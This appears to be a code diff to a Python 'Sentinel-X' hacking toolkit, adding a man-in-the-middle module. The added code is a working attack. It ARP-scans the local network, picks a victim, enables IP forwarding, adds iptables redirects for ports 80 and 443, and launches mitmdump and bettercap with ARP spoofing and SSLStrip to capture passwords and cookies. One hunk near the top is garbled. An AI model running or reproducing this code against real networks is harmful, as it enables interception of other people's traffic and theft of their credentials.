@@ -9,6 +9,9 @@ import random
 from datetime import datetime
 from colorama import Fore, Back, Style, init
 import pyttsx3
+import subprocess
+import shutil
+import signal
 
 # --- DEPENDENCY CHECK ---
 try:
@@ -171,8 +174,7 @@ def web_pentest():
         print(Fore.YELLOW + "[*] Fingerprinting Server...")
         r = requests.get(target, timeout=5)
         print(Fore.CYAN + f"    Server: {r.headers.get('Server', 'Hidden')}")
-        print(Fore.CYAN + f"    Tech  : {r.headers.
- TECH) ---
+        print(Fore.CYAN + f"    Tech  : {r.headers.get('server', 'TECH')}") ---
 def web_pentest():
     speak("Web Reconnaissance Mode.")
     target = input(Fore.WHITE + "\nroot@sentinel:~/web# Enter Target IP/URL: ")
@@ -233,35 +235,149 @@ def network_sniffer():
         log("Run as Administrator to sniff packets!", "ERROR")
 
 # --- 5. REAL ARP NETWORK SCANNER (Replaces Fake MITM) ---
-def mitm_simulation():
-    # Changed from "Fake Password Hack" to "Real Network Mapping"
-    # This is the first step of a real MITM attack (Target Discovery)
-    if not SCAPY_AVAILABLE:
-        log("Scapy required.", "ERROR"); return
+## --- CORE UTILITY: TOOL CHECK ---
+def check_dependencies():
+    essential_tools = ["bettercap", "mitmdump", "iptables"]
+    missing = [tool for tool in essential_tools if not shutil.which(tool)]
+    return missing
 
-    speak("Scanning Local Network for Active Devices.")
-    target_ip = input(Fore.WHITE + "\nroot@sentinel:~/mitm# Enter Gateway IP (e.g. 192.168.1.1/24): ")
+# --- 5. FINAL ELITE MITM MODULE ---
+def mitm_simulation():
+    # 1. Pre-Flight Checks
+    missing = check_dependencies()
+    if missing:
+        log(f"Missing tools: {', '.join(missing)}. Install them first!", "ALERT")
+        return
+
+    os.system('cls' if os.name == 'nt' else 'clear')
     
-    log("Broadcasting ARP Requests...", "INFO")
-    
+    # Professional Header
+    print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
+    print(f"{Fore.WHITE}   SENTINEL-X ELITE   |   INTERNAL NETWORK EXPLOITATION V3.0")
+    print(f"{Fore.RED}" + "═"*65)
+
+    # 2. Interface & Target Setup
     try:
-        # Create ARP packet
-        arp = ARP(pdst=target_ip)
-        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-        packet = ether/arp
+        # Auto-detect interfaces
+        ifaces = os.listdir('/sys/class/net/')
+        print(f"{Fore.YELLOW}[*] Available Interfaces:")
+        for i, iface in enumerate(ifaces):
+            print(f"    {Fore.CYAN}[{i}] {Fore.WHITE}{iface}")
         
-        # Send and receive
-        result = srp(packet, timeout=3, verbose=0)[0]
+        if_choice = int(input(f"\n{Fore.YELLOW}Select Interface ID: {Fore.WHITE}"))
+        interface = ifaces[if_choice]
+
+        # Scan for targets automatically
+        log(f"Broadcasting ARP on {interface}...", "INFO")
+        from scapy.all import ARP, Ether, srp
+        net_prefix = ".".join(os.popen("hostname -I").read().split()[0].split(".")[:-1]) + ".0/24"
+        print(f"{Fore.CYAN}[?] Scanning default range: {net_prefix}")
         
-        print(Fore.GREEN + "\nIP ADDRESS\t\tMAC ADDRESS")
-        print("-----------------------------------------")
-        for sent, received in result:
-            print(f"{Fore.CYAN}{received.psrc}\t\t{Fore.WHITE}{received.hwsrc}")
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net_prefix), timeout=3, iface=interface, verbose=False)
         
-        speak(f"Scan complete. Found {len(result)} devices.")
+        devices = []
+        print(f"\n{Fore.MAGENTA}ID\tIP ADDRESS\t\tMAC ADDRESS")
+        for i, (s, r) in enumerate(ans):
+            devices.append(r.psrc)
+            print(f"{Fore.GREEN}{i}\t{r.psrc:<15}\t{Fore.WHITE}{r.hwsrc}")
+        
+        target_idx = int(input(f"\n{Fore.YELLOW}Select Target ID: {Fore.WHITE}"))
+        target_ip = devices[target_idx]
+        gateway_ip = input(f"{Fore.YELLOW}Enter Gateway IP: {Fore.WHITE}")
 
     except Exception as e:
-        log(f"Scan Failed: {e}", "ERROR")
+        log(f"Setup Error: {e}", "ERROR")
+        return
+
+    # 3. Log Directory & Files
+    log_folder = "sentinel_vault"
+    if not os.path.exists(log_folder): os.makedirs(log_folder)
+    
+    session_id = datetime.now().strftime("%H%M%S")
+    pcap_out = f"{log_folder}/session_{session_id}.pcap"
+    cred_out = f"{log_folder}/creds_{session_id}.txt"
+
+    # 4. Attack Execution
+    try:
+        speak("Initializing elite interception engines.")
+        log("Hardening Network Configuration...", "INFO")
+        
+        # IP Forwarding & Iptables Cleanup
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        os.system("iptables -t nat -F") # Clear old rules
+        
+        # Routing
+        os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
+        os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080")
+
+        # Launching Mitmproxy (with Stream log)
+        mitm_proc = subprocess.Popen(
+            ["mitmdump", "--mode", "transparent", "--save-stream", pcap_out],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+
+        # Launching Bettercap (with SSLStrip & ARP Spoof)
+        # SSLStrip bettercap mein 'http.proxy' se handle hota hai
+        better_cmd = [
+            "bettercap", "-iface", interface, "-eval", 
+            f"set arp.spoof.targets {target_ip}; set http.proxy.sslstrip true; arp.spoof on; net.sniff on"
+        ]
+        better_proc = subprocess.Popen(better_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        time.sleep(3) # Let engines warm up
+
+        # 5. DASHBOARD UI
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
+        print(f"{Fore.WHITE}   STRIKE STATUS: {Fore.GREEN}RUNNING")
+        print(f"{Fore.RED}" + "═"*65)
+        print(f"{Fore.YELLOW} TARGET   : {Fore.WHITE}{target_ip}")
+        print(f"{Fore.YELLOW} INTERFACE: {Fore.WHITE}{interface}")
+        print(f"{Fore.YELLOW} VAULT    : {Fore.WHITE}{pcap_out}")
+        print(f"{Fore.YELLOW} SSLSTRIP : {Fore.GREEN}ENABLED")
+        print(f"{Fore.RED}" + "═"*65)
+        
+        print(f"\n{Fore.CYAN}[*] Scentinel-X is now a bridge between Target and Router.")
+        print(f"{Fore.WHITE}[!] Monitoring for Clear-text Passwords & Cookies...")
+        print(f"{Fore.RED}[!] Press CTRL+C to Safely Stop and Save Data.")
+
+        
+
+        while True:
+            # Check if processes are still alive
+            if mitm_proc.poll() is not None or better_proc.poll() is not None:
+                log("One of the engines crashed! Emergency exit.", "ALERT")
+                break
+                
+            # Live traffic animation
+            for dot in [".  ", ".. ", "..."]:
+                print(f"{Fore.MAGENTA}\r[+] SNIFFING{dot}", end="")
+                time.sleep(0.5)
+
+    except KeyboardInterrupt:
+        print(f"\n\n{Fore.YELLOW}[!] TERMINATION SIGNAL RECEIVED.")
+        
+        # Graceful Shutdown
+        better_proc.send_signal(signal.SIGINT)
+        mitm_proc.send_signal(signal.SIGINT)
+        time.sleep(2)
+        
+        better_proc.terminate()
+        mitm_proc.terminate()
+
+        # Final Cleanup
+        log("Restoring Network Settings...", "INFO")
+        os.system("iptables -t nat -F")
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        
+        print(f"\n{Fore.GREEN}╔═══════════════════════════════════════════════════════╗")
+        print(f"║ {Fore.WHITE}SESSION ARCHIVED: {pcap_out:<33} ║")
+        print(f"║ {Fore.WHITE}STATUS: All background rules cleared.                 ║")
+        print(f"╚═══════════════════════════════════════════════════════╝")
+        
+        speak("Interception successful. Data archived in vault.")
+        time.sleep(3)
+        banner()
 
 # --- 6. REAL MULTI-THREADED PORT SCANNER ---
 def port_scanner():
@@ -325,4 +441,5 @@ def main():
 
 if __name__ == "__main__": 
     main()
+
 
